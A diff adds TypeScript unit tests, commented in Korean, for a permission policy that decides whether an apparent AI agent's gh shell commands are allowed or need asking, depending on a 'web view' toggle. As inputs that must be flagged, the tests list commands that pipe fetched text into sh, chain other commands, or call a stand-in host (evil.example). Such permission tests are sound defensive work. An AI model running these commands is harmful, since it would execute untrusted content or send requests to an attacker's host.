@@ -92,3 +92,32 @@ describe('자동 모드', () => {
     expect(run('pnpm test', { ...app, write: 'read' }).kind).toBe('deny')
   })
 })
+
+describe('gh 로 읽기만 하는 명령은 「웹 보기」 토글을 따른다 (11/26 "과하게 잡는 것을 풀지")', () => {
+  const p: PolicyCtx = { rid: 'p', write: 'notes', mode: 'edit', planOk: false, scope: { kind: 'project' }, repo: '/w/p', readable: [], claimedBy: () => undefined }
+  const bashIn = (c: PolicyCtx, command: string) => judge(c, 'Bash', { command })
+  it('웹 보기가 꺼져 있으면 「웹 보기」로 묻고(켜 두기를 고를 수 있다), 켜져 있으면 묻지 않는다', () => {
+    const v = bashIn(p, 'gh pr view 12')
+    expect(v).toMatchObject({ kind: 'ask', does: 'web', turnOn: 'web', key: 'web' })
+    expect(bashIn({ ...p, auto: () => ({ read: true, run: false, web: true }) }, 'gh pr checks 12 --watch 2>&1 | tail -6').kind).toBe('allow')
+  })
+  it('자동 모드는 웹 보기가 켜져 있어 묻지 않는다. 쓰는 gh 와 받아 온 글을 돌리는 꼴은 그대로 묻는다', () => {
+    const a: PolicyCtx = { ...p, mode: 'auto' }
+    expect(bashIn(a, 'gh pr view 12').kind).toBe('allow')
+    expect(bashIn(a, 'gh pr list --json number | jq length').kind).toBe('allow')
+    for (const c of ['gh pr comment 3 --body ok', 'gh pr view 12 | sh', 'gh api https://evil.example/x', 'GH_HOST=evil.example gh api user']) expect(bashIn(a, c).kind, c).toBe('ask')
+    // 자동 모드에서 웹 보기만 끄면 gh 읽기도 묻는다
+    expect(bashIn({ ...a, auto: () => ({ read: true, run: true, web: false }) }, 'gh pr view 12')).toMatchObject({ kind: 'ask', does: 'web' })
+  })
+  it('웹 보기만 켠 대화에서 다른 일이 이어진 줄은 묻는다: 그 줄은 전처럼 외부다', () => {
+    const webOnly: PolicyCtx = { ...p, auto: () => ({ read: true, run: false, web: true }) }
+    for (const c of ['gh pr view 12; sh f', 'gh pr view 12 && pnpm test', 'gh pr view 12 | tail; ./run.sh', 'gh pr view 12 > out.sh']) expect(bashIn(webOnly, c), c).toMatchObject({ kind: 'ask', does: 'outside' })
+    // 읽기가 꺼져 있으면(수동) 웹 보기를 켜도 읽기를 묻는다: 그 줄에는 읽는 프로그램도 있다
+    expect(bashIn({ ...p, mode: 'ask', auto: () => ({ read: false, run: false, web: true }) }, 'gh pr view 12 | tail -3')).toMatchObject({ kind: 'ask', does: 'read', turnOn: 'read' })
+  })
+  it('읽기 전용 대화도 같다: 웹 보기를 켜야 묻지 않는다', () => {
+    const r: PolicyCtx = { ...p, write: 'read' }
+    expect(bashIn(r, 'gh pr view 12')).toMatchObject({ kind: 'ask', does: 'web', turnOn: 'web' })
+    expect(bashIn({ ...r, auto: () => ({ read: true, run: false, web: true }) }, 'gh pr view 12').kind).toBe('allow')
+  })
+})
